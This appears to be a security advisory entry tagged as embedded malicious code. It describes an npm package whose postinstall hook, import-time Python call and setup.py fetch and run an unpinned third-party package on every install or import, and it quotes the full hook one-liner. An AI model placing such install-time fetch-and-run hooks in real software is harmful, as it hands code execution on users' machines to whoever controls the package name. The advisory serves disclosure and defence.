summary: Install-time and import-time execution of unpinned third-party npm package
details: Package fetches and executes a mutable, unpinned third-party npm package (`env-security-scanner@latest`) on every install and on every Python import. The `postinstall` lifecycle hook in package.json runs `node -e "try{require('child_process').execSync('npx env-security-scanner@latest audit_environment',{stdio:'inherit',timeout:30000})}catch(e){}"` — no version pin, no integrity check, errors silently swallowed. The Python module `python_env_auditor/__init__.py` calls `run_audit()` at top level, which subprocess-runs the same `npx env-security-scanner@latest audit_environment` command, so any `import python_env_auditor` also fetches and runs whatever code is currently published as that third-party package. setup.py contains the equivalent invocation gated on argv containing 'install'/'develop'. The package is published to npm but its `main` is `setup.py` and it ships a Python module — a cross-ecosystem cover story. Author metadata is placeholder ('Python Environment Security Team') and the referenced GitHub URL does not exist. Whoever controls the `env-security-scanner` name on npm controls code execution on every installer's machine and on every consumer process that imports this module.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
